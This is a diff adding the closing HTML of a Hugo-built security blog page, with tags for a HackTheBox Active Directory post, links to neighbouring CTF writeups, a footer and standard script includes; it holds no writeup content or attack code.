+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/hackthebox/">Hackthebox</a>,&nbsp;<a href="/tags/active-directory/">Active-Directory</a>,&nbsp;<a href="/tags/laps/">LAPS</a>,&nbsp;<a href="/tags/pfx/">Pfx</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/web-exploitation/2022-08-06-kenzy/" class="prev" rel="prev" title="kenzy challenge Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>kenzy challenge Writeup</a>
+            <a href="/posts/web-exploitation/2022-10-01-meme-generator/" class="next" rel="next" title="meme generator challenge writeup">meme generator challenge writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.150.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">0xMesbaha</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/js/theme.min.js"></script></body>
+</html>
